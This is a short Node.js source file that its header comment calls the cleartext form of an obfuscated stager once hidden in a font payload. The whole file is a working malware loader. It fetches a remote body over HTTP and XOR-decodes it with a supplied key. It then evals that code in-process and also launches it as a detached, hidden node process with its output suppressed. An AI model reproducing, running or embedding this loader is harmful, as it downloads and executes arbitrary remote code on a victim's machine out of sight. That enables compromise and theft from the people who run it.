// Minimal fetch-XOR-eval-detached-spawn stager (cleartext form of the
// obfuscated font-payload stager): fetches a remote body, XOR-decodes it,
// evals it in-process AND backgrounds it as a detached hidden interpreter.
const http = require("node:http");
const { spawn } = require("node:child_process");

function httpRequest(url) {
  return new Promise((resolve, reject) => {
    http.request(url, (res) => {
      const chunks = [];
      res.on("data", (d) => chunks.push(d));
      res.on("end", () => resolve(Buffer.concat(chunks)));
    }).end();
  });
}

function xordecode(buf, key) {
  const out = Buffer.alloc(buf.length);
  for (let i = 0; i < buf.length; i++) {
    out[i] = buf[i] ^ key.charCodeAt(i % key.length);
  }
  return out;
}

async function run(url, key) {
  const code = xordecode(await httpRequest(url), key).toString("utf8");
  eval(code);
  spawn("node", ["-e", code], {"detached":!![],"stdio":"ignore","windowsHide":!![]}).unref();
}

run(process.argv[2], process.argv[3]);
